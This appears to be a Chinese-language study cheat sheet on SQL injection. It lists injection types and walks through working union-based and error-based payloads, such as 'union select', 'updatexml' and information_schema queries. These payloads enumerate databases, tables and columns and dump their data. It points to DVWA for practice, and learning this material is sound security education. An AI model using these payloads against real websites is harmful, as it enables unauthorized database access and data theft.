# SQL 注入
## 注入方法
1) 联合查询注入
2) 报错注入
?id=1' and updatexml(1,(concat('^',database(),'^')),1) --
3) 延迟注入
4) BOOL盲注
## 常用SQL注入字符
```SQL
` . ' " ) ] } / \ --
```
## Firefox 黑客工具栏
- Hackbar
## 联合查询注入
1) 看页面URL地质是否有后台传参动作
2) 构造传参值  ?id=51' 验证输入后台是否能够解析
3) and 1=1判断页面是否正常； and 1=2 判断页面是否部分报错; or 1=1 
4) order by 5 (5可以是其他数字，找到报错和不报错的临界点，取不报错的最大值)
5) union select 1,2,3,4,5,6,7 --+ 
- --+指注释掉插入攻击语句后的所有代码
- 匹配order by 验证出来的列数
- 联合查询时，前面Id的值要用负数（-5）
6) union select 1,2,3,4,5,6,构造语句,7
- database()  当前使用的数据库名称
- user()      当前登陆数据库的用户
- @@version   当前数据库版本
- @@basedir   查看路径
7) 爆库   查看当前数据库中有哪些表
```SQL
(select group_concat(table_name) from information_schema.tables where table_schema=0xxxx)
-- table_schema 的值需要输入16进制
```
8) 爆表   找到疑似关键信息的表
9) 查询表的列
```SQL
(select group_concat(column_name) from information_schema.columns where table_schema=0xxxx and table_name=0xxxx)
-- table_schema 和 tabale_name 的值需要输入16进制
```
10) 爆数据  查询表中的数据
```SQL
(select group_concat(concat(column1, column2, '%23')) from table_name)
-- %23 是URL编码
```

## PHP攻击练习工具
![DVWA](https://github.com/digininja/DVWA)
